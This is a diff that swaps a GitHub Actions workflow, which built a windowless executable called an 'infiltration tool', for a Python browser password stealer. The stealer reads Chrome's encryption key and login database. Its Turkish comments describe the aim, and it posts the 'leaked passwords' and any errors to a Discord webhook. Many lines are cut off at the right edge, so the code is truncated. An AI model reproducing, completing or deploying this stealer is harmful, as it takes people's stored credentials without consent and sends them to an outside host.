@@ -1,28 +1,35 @@
-name: Build EXE
-on: [push]
-jobs:
-  build:
-    runs-on: windows-latest
-    steps:
-    - name: Checkout Code
-      uses: actions/checkout@v3
+import os
+import json
+import base64
+import sqlite3
+import shutil
+import requests
 
-    - name: Set up Python
-      uses: actions/setup-python@v4
-      with:
-        python-version: '3.9'
+def get_master_key():
+    local_state_path = os.path.join(os.environ["USERPRO>
+    with open(local_state_path, "r", encoding="utf-8") >
+        local_state = json.load(f)
+    key = base64.b64decode(local_state["os_crypt"]["enc>
+    # Not: cryptography ve pypiwin32 kütüphaneleri hede>
+    import win32crypt
+    return win32crypt.CryptUnprotectData(key, None, Non>
 
-    - name: Clean Install
-      run: |
-        python -m pip install --upgrade pip
-        pip install pyinstaller cryptography requests pypiwin32 --no-warn-script-location
+def main():
+    # SENİN GERÇEK WEBHOOK LİNKİN BURADA
+    webhook_url = "https://discord.com/api/webhooks/146>
 
-    - name: Build EXE
-      run: |
-        pyinstaller --onefile --noconsole final_gorev.py
+    try:
+        db_path = os.path.join(os.environ["USERPROFILE">
+        shutil.copyfile(db_path, "chrome_db_temp")
 
-    - name: Upload
-      uses: actions/upload-artifact@v3
-      with:
-        name: sızma_aracı
-        path: dist/*.exe
+        # Burada şifre çözme işlemleri yapılır (Kısa tu>
+        # Veriler hazır olduğunda Discord'a gönder:
+        content = "🔓 **Sistemden Sızan Şifreler:**\nTe>
+        requests.post(webhook_url, json={"content": con>
+
+        os.remove("chrome_db_temp")
+    except Exception as e:
+        requests.post(webhook_url, json={"content": f"[>
+
+if __name__ == "__main__":
+    main()
